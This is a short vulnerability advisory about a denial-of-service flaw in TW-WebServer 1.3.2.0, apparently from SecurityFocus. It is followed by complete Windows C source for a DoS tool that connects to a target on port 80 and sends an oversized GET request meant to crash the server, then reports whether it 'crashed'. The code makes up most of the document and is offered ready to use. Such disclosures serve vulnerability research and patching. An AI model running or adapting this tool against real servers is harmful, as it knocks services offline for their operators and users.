source: http://www.securityfocus.com/bid/7368/info
 
It has been reported that TW-WebServer is prone to a denial of service vulnerability. Reportedly when an excessive quantity of data is sent to the TW-Webserver as part of a malicious HTTP GET request the server will fail.
 
Although unconfirmed, due to the nature of this vulnerability, an attacker may have the ability to supply and execute arbitrary code. 

/*
    
 >> by Shashank pandey
  
  

 >>http://geekgroove.8m.com
 Twilight Utilities TW-WebServer/1,3,2,0 
#
# Vulnerable systems:
# TW-WebServer/1, 3, 2, 0
#
  
*/
#include <windows.h>
#include <winsock.h>
#include <stdio.h>
#pragma comment (lib,"ws2_32")
void graphitte()
{printf("\n---------------------------------- ");
 printf("\nTW-WebServer/1, 3, 2, 0 DoS tool  |  \n");
 printf("--------------------------------- |\n");
 printf("      by Shashank Pandey          |\n");
 printf("(reach_shash@linuxmail.org)       |\n"); 
 printf("---------------------------------- \n");
 
}
int main(int argc, char *argv[])
{
     
  WSADATA wsaData;
      
      
      
      
      int s;
  
  char trash[100];
  
struct hostent *yo;
   struct sockaddr_in heck;
  char buffer[4096] ="";
      char myrequest[5000];    
      
  
  
  graphitte();
       
     
    
if(WSAStartup(0x0101,&wsaData)!=0) {
      printf("Error :Cudn't initiate winsock!");
      return 0;
      }
if(argc<2)
{printf("Usage : %s I.P/Hostname\n\n",argv[0]);
  exit(0);}
  if ( (yo = gethostbyname(argv[1]))==0)
  {
    printf("error: can't resolve '%s'",argv[1]);
    return 1;
  }
printf("\nChecking web server %s\n",argv[1]);
      
   
  heck.sin_port = htons(80);
  heck.sin_family = AF_INET;
  heck.sin_addr = *((struct in_addr *)yo->h_addr);
  if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1){
    printf("error: can't create socket");
    return 1;
  }
  
  if ((connect(s, (struct sockaddr *) &heck, sizeof(heck))) == -1){
    printf("Error:Cudn't Connect\r\n");
    return 1;
  }
 
  
  
buffer[sizeof(buffer)]=0x00;
  memset(buffer,'S',sizeof(buffer));
  memset(myrequest,0,sizeof(myrequest));
      memset(trash,0,sizeof(trash));
      sprintf(myrequest,"GET %s HTTP/1.0\r\n\r\n",buffer);
      
      printf("\r\nTrying oveflow request... ");
      send(s,myrequest,strlen(myrequest),0);
      
      printf("Evil Request SENT\r\n");
      recv(s,trash,sizeof(trash),0);
      if(trash[0]==0x00) 
  {
      printf("Server Crashed :-) !.\r\n");
  
       
      } 
  
  else
      
  
  printf("Server is prolly patched.\r\n");
      
  closesocket(s);
  



WSACleanup();
    


}